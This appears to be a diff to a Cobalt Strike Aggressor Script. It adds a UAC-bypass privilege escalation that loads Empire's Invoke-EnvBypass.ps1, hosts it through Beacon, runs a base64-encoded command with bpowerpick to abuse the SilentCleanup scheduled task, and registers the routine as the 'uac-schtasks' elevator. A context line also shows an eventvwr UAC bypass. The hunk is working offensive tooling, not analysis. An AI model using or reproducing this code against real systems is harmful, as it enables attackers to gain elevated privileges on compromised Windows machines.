@@ -2,6 +2,31 @@
 # Integrate several privilege escalation exploits into Cobalt Strike via Aggressor Script
 # 
 
+# Integrate 
+# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
+sub schtasks_elevator {
+	local('$handle $script $oneliner $command');
+
+	# acknowledge this command
+	btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");
+
+	# read in the script
+	$handle = openf(getFileProper(script_resource("modules"), "Invoke-EnvBypass.ps1"));
+	$script = readb($handle, -1);
+	closef($handle);
+
+	# host the script in Beacon
+	$oneliner = beacon_host_script($1, $script);
+
+	# base64 encode the command
+	$command  = transform($2, "powershell-base64");
+
+	# run the specified command via this exploit.
+	bpowerpick!($1, "$oneliner $+ ; Invoke-EnvBypass -Command \" $+ $command $+ \"");
+}
+
+beacon_elevator_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_elevator);
+
 # Integrate Matt Nelson's file-less eventvwr.exe Bypass UAC attack
 # Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
 sub eventvwr_elevator {
